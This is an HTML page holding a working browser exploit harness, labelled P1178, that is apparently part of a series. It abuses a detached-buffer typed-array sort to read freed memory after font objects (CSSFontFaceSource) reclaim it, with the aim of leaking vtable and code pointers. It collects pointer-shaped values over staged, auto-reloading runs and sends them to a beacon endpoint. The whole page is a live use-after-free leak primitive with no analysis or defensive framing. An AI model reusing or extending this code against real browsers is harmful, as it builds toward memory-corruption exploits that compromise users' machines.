<!DOCTYPE html><html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
<title>P1178 Sort-Read Vtable Leak (source reclaim)</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#050508;color:#e8ffe8;font:14px/1.5 'Courier New',monospace;padding:12px}
#hud{background:#0a0a18;border:2px solid #2a2a5a;border-radius:10px;padding:12px;margin-bottom:10px}
#hud h1{color:#00ff88;font-size:18px;margin-bottom:6px}
#status{font-size:20px;font-weight:bold;color:#ffd75e;padding:6px 0}
#phase{font-size:16px;color:#00ffee}
#counters{font-size:14px;color:#b9c6ee;line-height:1.8}
#finds{font-size:14px;color:#ff55c8;line-height:1.7;white-space:pre-wrap;word-break:break-all}
#log{background:#0a0a12;border:1px solid #22223a;border-radius:8px;padding:8px;margin-top:8px;
max-height:40vh;overflow-y:auto;font-size:12px;white-space:pre-wrap;word-break:break-all}
.ok{color:#00ff88}.err{color:#ff4466}.info{color:#44aaff}.warn{color:#ffaa00}.hit{color:#ff00ff;font-weight:bold}
</style>
</head><body>
<div id="hud">
  <h1>P1178 — SORT-READ VTABLE LEAK (CSSFontFaceSource reclaim)</h1>
  <div id="status">BOOTING...</div>
  <div id="phase">phase: init</div>
  <div id="counters">stage: ?</div>
  <div id="finds">no findings yet</div>
</div>
<div id="log"></div>
<script>
'use strict';
var L=document.getElementById('log'),S=document.getElementById('status'),
PH=document.getElementById('phase'),CT=document.getElementById('counters'),FD=document.getElementById('finds');
var T0=Date.now();
function setStatus(t){S.textContent=t;}
function setPhase(t){PH.textContent='phase: '+t;}
function setCounters(t){CT.textContent=t;}
function addFind(t){var d=document.createElement('div');d.textContent=t;FD.textContent='';FD.appendChild(d);}
function log(m,c){var d=document.createElement('div');d.className=c||'';
d.textContent='['+(((Date.now()-T0)/1000).toFixed(1))+'s] '+m;L.appendChild(d);L.scrollTop=1e6;}
function B(tag,data){try{var u='/beacon.php?tag=P1178-'+encodeURIComponent(tag);
if(data)u+='&data='+encodeURIComponent(String(data).slice(0,900));
u+='&t='+Date.now();new Image().src=u;}catch(e){}}
window.onerror=function(m,s,l){try{B('JSERR',m+'@'+l);}catch(e){}};

var _b8=new ArrayBuffer(8),_f64=new Float64Array(_b8),_bu;
try{_bu=new BigUint64Array(_b8);}catch(e){}
function f2big(v){if(_bu){_f64[0]=v;return '0x'+_bu[0].toString(16);}
_f64[0]=v;return '0x'+v.toString(16);}

/* ═══════════════════════════════════════════════════════════════════════
   P1178: leak a CSSFontFaceSource vtable via the sort-READ channel.
   P1177 proved the detached sort's READS see reclaimed memory (P1061-E)
   but WRITES don't reach it. So: Float64Array(24) over AB(192) -> detach
   mid-sort -> in the comparator, the font machinery allocates a
   CSSFontFace/CSSFontFaceSource (fastMalloc 192B-class, vtable at +0) ->
   LIFO takes the freed slot -> comparator reads the object's bytes as
   doubles -> f2big -> vtable/code-pointer leak candidate.
   Stages:
   0: single attempt (record all 24 doubles hex)
   1: 10 attempts, collect distinct pointer-shaped values
   2: control — no reclaim (empty comparator after detach): baseline
   3: FontFace with TWO local sources (more source objects)
   ═══════════════════════════════════════════════════════════════════════ */

var STAGES=['single','x10','control','twosrc'];
var stage=0,results=[];
try{stage=parseInt(localStorage.getItem('p1178_stage')||'0');}catch(e){}
try{var r=localStorage.getItem('p1178_res');if(r)results=JSON.parse(r);}catch(e){}
if(!Array.isArray(results))results=[];
B('BOOT','stage='+stage+'|'+STAGES[stage]);
setStatus('STAGE '+stage+'/3 — '+STAGES[stage]);

if(stage>=STAGES.length){
  setStatus('ALL DONE');
  B('ALL-DONE',JSON.stringify(results).slice(0,800));
  log('=== ALL DONE ===','ok');
  try{localStorage.removeItem('p1178_stage');}catch(e){}
}else{

try{localStorage.setItem('p1178_stage',''+(stage+1));}catch(e){}
var cur=STAGES[stage];

function oneAttempt(srcSpec,doReclaim){
  var ab=new ArrayBuffer(192);
  var ta=new Float64Array(ab);
  for(var i=0;i<24;i++)ta[i]=i*1.5+0.25;
  var detached=false,reclaimed=false;
  var readVals=[];
  try{
    ta.sort(function(a,b){
      if(!detached){
        detached=true;
        structuredClone(ab,{transfer:[ab]});
      }else if(doReclaim&&!reclaimed){
        reclaimed=true;
        try{
          var ff=new FontFace('leak'+Date.now()%1000,srcSpec);
          document.fonts.add(ff);
          void ff.loaded;
        }catch(e){B('RECL-ERR',String(e.message).slice(0,30));}
      }
      readVals.push(a);
      return a-b;
    });
  }catch(e){B('SORT-ERR',e.constructor.name+':'+String(e.message).slice(0,40));}
  /* convert the FIRST few comparator values (post-reclaim) to bits */
  var hexes=[];
  for(var h=0;h<readVals.length&&h<30;h++){
    hexes.push(f2big(readVals[h]));
  }
  return {detached:detached,reclaimed:reclaimed,vals:readVals.length,hexes:hexes};
}

function classify(hexes){
  var ptrs=[],other=[];
  for(var i=0;i<hexes.length;i++){
    var h=hexes[i];
    if(h.length>10&&h.indexOf('0000000000000000')!==0){ptrs.push(h);}
    else if(h!=='0x0000000000000000'){other.push(h);}
  }
  return {ptrs:ptrs,other:other};
}

function done(rep){
  results.push({stage:stage,name:cur,result:rep});
  try{localStorage.setItem('p1178_res',JSON.stringify(results));}catch(e){}
  B('RESULT',rep.slice(0,800));
  addFind(cur+': '+rep.slice(0,300));
  setStatus(rep.slice(0,80));
  log('=== '+cur+' -> '+rep+' ===','ok');
  B('NEXT');
  setTimeout(function(){location.reload(true);},700);
}

if(cur==='single'){
  setPhase('single source-reclaim attempt');
  B('RUN','single');
  var r0=oneAttempt('local(Arial)',true);
  var c0=classify(r0.hexes);
  done('det='+r0.detached+'|rec='+r0.reclaimed+'|n='+r0.vals+
    '|ptrs='+c0.ptrs.slice(0,6).join(',')+'|other='+c0.other.slice(0,4).join(','));
}else if(cur==='x10'){
  setPhase('10 attempts');
  var allPtrs={};
  for(var k=0;k<10;k++){
    var rk=oneAttempt('local(Arial)',true);
    var ck=classify(rk.hexes);
    for(var p=0;p<ck.ptrs.length;p++)allPtrs[ck.ptrs[p]]=(allPtrs[ck.ptrs[p]]||0)+1;
  }
  var keys=Object.keys(allPtrs);
  keys.sort(function(x,y){return allPtrs[y]-allPtrs[x];});
  done('uniqPtrs='+keys.length+'|top='+keys.slice(0,6).map(function(kk){return kk+'x'+allPtrs[kk];}).join(','));
}else if(cur==='control'){
  setPhase('control: no reclaim');
  B('RUN','control');
  var r2=oneAttempt('local(Arial)',false);
  var c2=classify(r2.hexes);
  done('det='+r2.detached+'|n='+r2.vals+'|ptrs='+c2.ptrs.slice(0,4).join(',')+'|other='+c2.other.slice(0,4).join(','));
}else if(cur==='twosrc'){
  setPhase('two local sources');
  B('RUN','twosrc');
  var r3=oneAttempt('local(Arial),local(Courier)',true);
  var c3=classify(r3.hexes);
  done('det='+r3.detached+'|rec='+r3.reclaimed+'|n='+r3.vals+'|ptrs='+c3.ptrs.slice(0,6).join(','));
}

} /* stage machine */

/* auto-reload checker */
(function(){
  var cur='P1178-vtable-leak';
  setTimeout(function check(){
    try{
      var x=new XMLHttpRequest();
      x.open('GET','/reload.txt?c='+Date.now(),true);
      x.onload=function(){
        var t=(x.responseText||'').trim();
        if(t&&t!==cur){location.reload(true);return;}
        setTimeout(check,3000);};
      x.onerror=function(){setTimeout(check,5000);};
      x.send();
    }catch(e){setTimeout(check,5000);}
  },4000);
})();
</script>
</body></html>
